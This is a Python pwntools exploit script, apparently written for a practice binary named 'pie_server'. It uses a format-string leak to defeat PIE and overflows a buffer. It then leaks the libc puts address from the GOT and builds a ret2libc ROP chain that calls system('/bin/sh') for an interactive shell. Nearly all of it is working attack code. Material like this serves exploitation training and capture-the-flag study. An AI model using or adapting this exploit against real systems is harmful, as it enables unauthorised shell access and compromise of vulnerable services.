#!/usr/bin/python3
from pwn import *
import sys
# context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
exe = './pie_server'
e = context.binary = ELF(exe, checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = e.debug(gdbscript='''
source /home/nick/global/halfdisp.py
break *vuln
c
'''
)
def find_ip(payload):
    p = process(exe)
    p.sendlineafter("name",b"AAAA")

    p.sendlineafter("is :P",payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

offset = find_ip(cyclic(300))

def fuzz(x):
    for i in range(x):
        try:
            p = process(exe)
            # Format the counter
            # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
            p.sendlineafter(b':', '%{}$p'.format(i).encode())
            # Receive the response
            p.recvuntil(b'Hello ')
            result = p.recvline()
            print(str(i) + ': ' + str(result))
            p.close()
        except EOFError:
            pass

pop_rdi = e.address+0x12ab

# Leak 15th address from stack (main+44)
p.sendlineafter(b':', '%{}$p'.format(15), 16)
p.recvuntil(b'Hello ')  # Address will follow
leaked_addr = int(p.recvline(), 16)
info("leaked_address: %#x", leaked_addr)

# Now calculate the PIEBASE
e.address = leaked_addr - 0x1224
info("piebase: %#x", e.address)
pop_rdi = e.address+0x12ab

rop = ROP(e)
ret=rop.find_gadget(["ret"])[0]
payload = flat([
    offset*b"\x90",
    pop_rdi,
    e.got.puts,
    e.plt.puts,
    e.symbols.vuln,

])
p.sendlineafter(b":P",payload)
p.recvlines(2)  # Blank line

# Retrieve got.puts address
got_puts = unpack(p.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
libc_base = got_puts - 0x80e50
info("libc_base: %#x", libc_base)
offset = find_ip(cyclic(300))

system  = libc_base+0x50d70
bin_sh= next(libc.search(b"/bin/sh\x00"))

bin_sh=bin_sh+libc_base
payload = flat([
    offset*b"\x90",
    p64(ret),
    pop_rdi,
    bin_sh,
    system
])
p.sendline(payload)
p.interactive()